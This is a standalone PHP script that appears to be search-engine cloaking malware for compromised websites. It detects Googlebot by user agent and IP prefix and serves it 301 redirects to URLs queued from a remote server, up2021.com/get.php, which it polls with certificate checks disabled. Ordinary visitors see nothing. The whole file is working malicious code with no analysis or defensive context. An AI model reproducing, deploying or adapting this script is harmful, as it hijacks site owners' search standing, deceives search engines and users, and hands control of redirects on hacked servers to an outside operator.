<?php

$conf_user_agent = 'Google301';
$conf_get_url = 'http://up2021.com/get.php';
$conf_time_recheck = 60;
$conf_redirect_type = 'HTTP/1.1 301 Moved Permanently';




ignore_user_abort(true);

if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {

    $google_ip = trim(strip_tags($_SERVER['HTTP_CF_CONNECTING_IP']));
} else {
    $google_ip = trim(strip_tags($_SERVER['REMOTE_ADDR']));
}
if (stripos($_SERVER['HTTP_USER_AGENT'], 'Googlebot', 0) !== false and stripos($google_ip, '66.249.', 0) !== false) {
    if (!is_dir(__DIR__ . '/queue')) {
        mkdir(__DIR__ . '/queue');
    }
    $google_links = glob(__DIR__ . "/queue/*");
    if (isset($google_links[0])) {
        $url = @trim(file_get_contents($google_links[0]));
        // Ð¾Ñ‚Ð´Ð°Ñ‡Ð° Ñ€ÐµÐ´Ð¸Ñ€ÐµÐºÑ‚Ð°
        header($conf_redirect_type);
        header('Location: ' . $url);
        @unlink($google_links[0]);
        die();
    } else {
        clearstatcache(true);
        $cron_update_time = (int) trim(@file_get_contents(__DIR__ . '/googlelinksupdate')) + 0;
        if (time() - $cron_update_time > $conf_time_recheck) {
            file_put_contents(__DIR__ . '/googlelinksupdate', time(), LOCK_EX);
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $conf_get_url);
            curl_setopt($ch, CURLOPT_HEADER, false);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 600);
            curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
            curl_setopt($ch, CURLOPT_TIMEOUT, 20);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 2);
            curl_setopt($ch, CURLOPT_USERAGENT, $conf_user_agent);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
            curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
            curl_setopt($ch, CURLOPT_FTP_SSL, CURLFTPSSL_TRY);
            $actual_links = @json_decode(trim(curl_exec($ch)), true);
            curl_close($ch);
            clearstatcache(true);
            $i = 0;
            foreach ($actual_links as $google_link) {
                $google_link = trim($google_link);
                if ($google_link != '') {
                    $i++;
                    file_put_contents(__DIR__ . '/queue/' . $i . '_' . rand(1, 999999), $google_link, LOCK_EX);
                }
            }
        }
    }
}
